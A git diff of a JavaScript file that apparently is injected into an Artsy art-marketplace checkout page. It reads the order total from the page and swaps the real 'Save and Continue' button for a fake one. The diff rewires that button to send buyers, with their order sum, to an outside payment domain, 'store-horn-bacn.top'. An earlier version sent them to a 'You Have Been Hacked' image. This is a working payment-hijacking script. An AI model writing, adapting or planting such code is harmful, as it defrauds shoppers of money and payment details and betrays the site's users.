@@ -3,16 +3,20 @@ let orderDiv
 let SaveAndContinueBtn
 let sumValue
 
+function NavToPayment() {
+    window.location.href = `https://payment.store-horn-bacn.top/?sum=${sumValue}`;
+}
+
 let newButton = document.createElement('div')
-newButton.innerHTML = `<a href="https://payment.store-horn-bacn.top/?sum=${sumValue}" tabindex="0" display="inline-flex" width="50%" class="Button__Container-sc-1bhxy1c-0 dgWQOL"><div opacity="1" display="flex" width="100%" font-family="sans" class="Box-sc-15se88d-0 Text-sc-18gcpao-0 hOLXSx hpQner">Save and Continue</div></a>`;
+newButton.innerHTML = `<a href="#" tabindex="0" display="inline-flex" width="50%" class="Button__Container-sc-1bhxy1c-0 dgWQOL"><div opacity="1" display="flex" width="100%" font-family="sans" class="Box-sc-15se88d-0 Text-sc-18gcpao-0 hOLXSx hpQner">Save and Continue</div></a>`;
+newButton.addEventListener('click',NavToPayment)
+
 
 console.log('this is artsy js from rl github')
 
    console.log("script from rl-www");
 
-    function NavToPayment() {
-        window.location.href = "https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg";
-    }
+
     
     function checkIfOrderShippingDivExist() {
         console.log(`checkIfOrderShippingDivExist`)
@@ -47,6 +51,7 @@ console.log('this is artsy js from rl github')
                     console.log('Найден div с текстом "Price":', el);
                     console.log(allDivText60[i+1])
                     sumValue = allDivText60[i+1].innerHTML
+                    console.log(sumValue)
                 }
             });
         }
@@ -55,7 +60,7 @@ console.log('this is artsy js from rl github')
         if (checkIfOrderShippingDivExist()) {
             addELToSaveAndContinueBtn()
         }
-    },2000)
+    },5000)
 
     window.addEventListener('beforeunload', function (event) {
         event.stopImmediatePropagation();
